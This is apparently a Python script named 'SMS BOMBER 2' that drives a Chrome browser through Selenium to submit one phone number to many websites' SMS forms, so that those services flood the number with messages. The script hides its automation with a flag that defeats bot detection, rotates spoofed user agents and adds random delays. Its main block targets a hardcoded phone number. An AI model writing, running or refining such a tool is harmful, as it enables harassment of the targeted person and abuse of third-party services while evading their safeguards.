from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
import time
import random
import pyfiglet
import os

print(pyfiglet.figlet_format("SMS BOMBER 2"))


def collect_info():
    init_info = {'phone_num': int(input('Enter phone number:')),
                 'loops': int(input('Enter number of loops (loops mean how many sms w'
                                    'ill be sent from the same service):'))}
    print("Good, We are working!")
    return init_info


def get_user_agent():
    user_agents = ['Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0',
                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)'
                   ' Chrome/77.0.3865.90 Safari/537.36',
                   'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_3) AppleWebKit/537.36 (KHTML, like Gecko)'
                   ' Chrome/99.0.4844.74 Safari/537.36']
    return random.choice(user_agents)


def collect_sites_with_elements():
    sites = []

    for file in os.listdir('dictionary'):
        if file.endswith('.txt'):
            sites.append(file)

    sites_with_elements = []

    for site in sites:
        with open(f'dictionary/{site}') as temp_file:
            elements_list = []
            for element in temp_file:
                elements_list.append(element.split('\n')[0])
            sites_with_elements.append({'site': site, "items": elements_list})
    return sites_with_elements


def process_one_field_page(phone_number):
    sites_with_elements = collect_sites_with_elements()

    for site in range(len(sites_with_elements)):

        # to check the browser is not a bot
        # https://intoli.com/blog/not-possible-to-block-chrome-headless/chrome-headless-test.html
        options = webdriver.ChromeOptions()
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument(f'user-agent={get_user_agent()}')
        service = Service(executable_path="webdrivers/chromedriver.exe")
        browser = webdriver.Chrome(service=service, options=options)

        current_dict_from_list = sites_with_elements[site]
        num_items_on_site = len(current_dict_from_list["items"])

        browser.get(f'https://{current_dict_from_list["items"][0]}/')
        time.sleep(random.randint(2, 5))

        for i in range(num_items_on_site):
            if i > 0:
                if i <= num_items_on_site - 1:
                    field_on_page = browser.find_element(By.XPATH, value=current_dict_from_list["items"][i])
                    field_on_page.click()
                    time.sleep(random.randint(2, 5))

        field_on_page = browser.find_element(By.XPATH, value=current_dict_from_list["items"][num_items_on_site - 1])
        field_on_page.click()
        field_on_page.send_keys(phone_number)
        time.sleep(random.randint(2, 5))
        field_on_page.send_keys(Keys.ENTER)
        time.sleep(random.randint(2, 5))
        browser.close()
        browser.quit()


if __name__ == "__main__":
    process_one_field_page("0974704989")

